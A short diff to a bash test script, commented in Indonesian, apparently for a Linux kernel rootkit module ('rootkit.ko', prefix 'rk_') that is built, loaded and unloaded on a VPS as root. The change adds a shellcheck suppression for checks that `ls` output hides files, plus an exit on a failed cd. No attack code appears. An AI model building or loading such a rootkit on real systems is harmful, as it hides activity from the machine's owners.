@@ -1,4 +1,5 @@
 #!/usr/bin/env bash
+# shellcheck disable=SC2010  # sengaja memeriksa output `ls` (uji visibility), bukan glob
 # test.sh — uji rootkit di VPS (butuh root + kernel headers).
 #
 # Setiap langkah punya assertion dan exit non-zero bila gagal. Versi lama hanya
@@ -9,7 +10,7 @@
 #   sudo ./test.sh build      # hanya build
 #   sudo ./test.sh load|unload
 set -uo pipefail
-cd "$(dirname "$0")"
+cd "$(dirname "$0")" || exit 1
 
 KO="rootkit.ko"
 PREFIX="rk_"
